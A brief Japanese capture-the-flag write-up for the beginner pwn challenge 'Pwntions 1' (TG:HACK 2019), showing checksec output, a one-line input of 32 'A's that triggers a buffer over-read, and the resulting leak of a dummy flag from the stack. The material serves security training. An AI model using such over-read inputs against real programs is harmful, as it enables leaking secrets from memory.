# [pwn 50pts] Pwntions 1 - TG:HACK 2019
32bitで全部無効です。
```
$ checksec -f pwntion1_public
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable  FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   91 Symbols     No	0		4	pwntion1_public
```

ご丁寧にCのコードまで渡されています。
バッファオーバーリードがあるのでスタック上のフラグが読めます。

```
$ python -c 'print("A"*32, end="")' | ./pwntion1_public 
Test banner


Professor maritio_o:
"As there is little foolish wand-waving here, many of you will
hardly believe this is magic. I don't expect you will really
understand the beauty of the softly simmering cauldron with
its shimmering fumes, the delicate power of liquids that
creep through the human veins, bewitching the minds, ensnaring
the senses... I can teach you how to bottle fame, brew glory,
and even stopper death - if you aren't as big a bunch of
dunderheads as I usually have to teach."

Student:
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAATG19{This is a dummy flag. Real flag on server.}
```

本番サーバーは動いてませんでした。

# 感想
pwn初心者向けの問題だと思います。
